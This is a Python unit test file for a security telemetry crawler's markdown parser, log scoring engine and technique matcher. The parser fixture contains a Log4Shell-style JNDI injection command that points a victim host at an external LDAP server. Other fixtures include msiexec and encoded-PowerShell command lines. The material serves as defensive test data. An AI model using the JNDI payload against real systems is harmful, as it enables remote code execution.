"""Unit tests for Telemetry & Log Crawler 2-Branch Architecture modules."""
import unittest
from src.shared.parsers.markdown_ast_parser import MarkdownASTParser
from src.shared.parsers.evtx_parser import EVTXMemoryParser
from src.usecases.step_4_telemetry._shared_engines.telemetry_matcher import TelemetryHybridMatcher
from src.usecases.step_4_telemetry._shared_engines.scoring_engine import TelemetryScoringEngine
from src.domain.models.telemetry import TelemetryItem


class TestTelemetryEnhancements(unittest.TestCase):

    def test_markdown_ast_parser(self):
        parser = MarkdownASTParser()
        sample_md = """
# Writeup Exploit

Execute this payload:
```bash
curl -H "X-Api-Version: ${jndi:ldap://10.0.0.1/a}" http://victim.com/
```

Sysmon output captured:
```sysmon
<Event>
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\msiexec.exe</Data>
  </EventData>
</Event>
```
"""
        blocks = parser.extract_code_blocks(sample_md)
        self.assertEqual(len(blocks), 2)
        self.assertEqual(blocks[0]["type"], "command")
        self.assertEqual(blocks[1]["type"], "log")

    def test_scoring_engine(self):
        engine = TelemetryScoringEngine()

        item_otrf = TelemetryItem(source="OTRF/mordor", log_data={"EventID": 1})
        item_synthetic = TelemetryItem(source="exploit.py", log_data={"cmd": "whoami"})

        auth_logs, synth_logs = engine.categorize_items([item_otrf, item_synthetic])
        self.assertEqual(len(auth_logs), 1)
        self.assertEqual(auth_logs[0].score, 10.0)
        self.assertEqual(auth_logs[0].label, "Authentic")

        self.assertEqual(len(synth_logs), 1)
        self.assertEqual(synth_logs[0].score, 3.0)
        self.assertEqual(synth_logs[0].label, "Synthetic")

    def test_hybrid_matcher(self):
        matcher = TelemetryHybridMatcher()

        item1 = TelemetryItem(source="OTRF", log_data={"CommandLine": "msiexec.exe /i payload.msi", "Technique": "T1059"})
        item2 = TelemetryItem(source="OTRF", log_data={"CommandLine": "powershell.exe -enc ...", "Technique": "T1059"})

        matched = matcher.match_logs(
            candidate_items=[item1, item2],
            keywords=["msiexec"],
            technique_ids=["T1059"]
        )

        self.assertTrue(len(matched) > 0)
        self.assertEqual(matched[0].log_data["CommandLine"], "msiexec.exe /i payload.msi")


if __name__ == "__main__":
    unittest.main()
